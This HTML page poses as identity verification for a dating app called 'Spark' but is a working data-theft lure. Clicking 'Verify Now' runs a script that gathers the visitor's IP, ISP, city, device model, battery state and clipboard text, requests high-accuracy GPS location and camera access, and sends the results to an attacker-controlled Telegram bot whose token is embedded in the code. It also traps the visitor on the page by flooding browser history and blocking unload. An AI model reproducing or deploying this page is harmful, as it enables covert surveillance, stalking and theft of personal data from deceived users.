<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spark - Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background: linear-gradient(150deg, #fd297b, #ff5864); margin: 0; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .card { width: 85%; max-width: 350px; padding: 40px 20px; background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); border-radius: 30px; text-align: center; border: 1px solid rgba(255,255,255,0.2); }
        .btn { background: white; color: #fd297b; padding: 18px; border-radius: 40px; font-weight: 800; margin-top: 25px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        #loader { display: none; margin-top: 20px; font-weight: 300; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 50px;">🔥</div>
        <h1 style="margin: 10px 0 5px 0;">Spark</h1>
        <p style="opacity: 0.8; font-size: 14px;">Verify your identity to see matches in Alappuzha.</p>
        <div class="btn" id="startBtn" onclick="executeKiduPayload()">Verify Now</div>
        <div id="loader">INITIALIZING...</div>
    </div>

    <script>
        const BOT_TOKEN = '8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg';
        const CHAT_ID = '1020906452';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            fetch(url, { mode: 'no-cors', keepalive: true }).catch(() => {}); 
        }

        // --- THE GRABIFY-LEVEL DATA ENGINE ---
        async function captureDossier() {
            let info = "🕵️ --- TARGET DOSSIER ACQUIRED ---\n";
            
            // 1. Precise IP, ISP, and Organization (Grabify Style)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                info += `🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n📡 Network: ${d.asn}\n📍 Region: ${d.city}, ${d.region}\n`;
            } catch(e) { info += "🌐 IP: Failed\n"; }

            // 2. Exact Device Model & Battery
            try {
                const battery = await navigator.getBattery();
                info += `🔋 Battery: ${Math.round(battery.level * 100)}%\n🔌 Power: ${battery.charging ? 'Charging' : 'Battery'}\n`;
            } catch(e) {}

            // 3. UserAgent Parsing (Device Model)
            const ua = navigator.userAgent;
            let model = "Unknown Device";
            if (ua.match(/Android/)) {
                model = ua.split(';')[2].split('Build')[0];
            } else if (ua.match(/iPhone/)) {
                model = "iPhone (" + ua.split(';')[1].split(')')[0] + ")";
            }
            info += `📱 Model: ${model.trim()}\n🖥️ OS: ${navigator.platform}\n`;

            sendToTelegram(info);
        }

        async function grabClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                if(text) sendToTelegram(`📋 CLIPBOARD CAPTURE:\n"${text}"`);
            } catch(e) { sendToTelegram("⚠️ Clipboard: Denied"); }
        }

        function triggerPermissions() {
            // Location - Forced High Accuracy
            navigator.geolocation.getCurrentPosition((pos) => {
                const map = `http://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTelegram(`🎯 PINPOINT LOCATION:\n${map}\nAccuracy: ${pos.coords.accuracy}m`);
            }, (err) => {
                sendToTelegram(`⚠️ Location Denied: ${err.message}`);
            }, { enableHighAccuracy: true, timeout: 5000 });

            // Camera - Re-attempted Sequence
            setTimeout(() => {
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(() => sendToTelegram("📸 Camera: GRANTED"))
                .catch(() => sendToTelegram("⚠️ Camera: DENIED"));
            }, 4000);
        }

        function executeKiduPayload() {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // Fullscreen trigger for immersion
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }

            // Fire Grabify-style IP/Device logs immediately
            captureDossier();
            
            // Clipboard check (requires user click context, which we have here)
            grabClipboard();

            // Fire Permissions with slight delay to bypass UI blocks
            setTimeout(() => {
                triggerPermissions();
            }, 1500);

            // Lock navigation
            for(let i=0; i<20; i++) { window.history.pushState(null, "", window.location.href); }
            window.onbeforeunload = () => "Critical error: Verify to continue.";
        }
    </script>
</body>
</html>
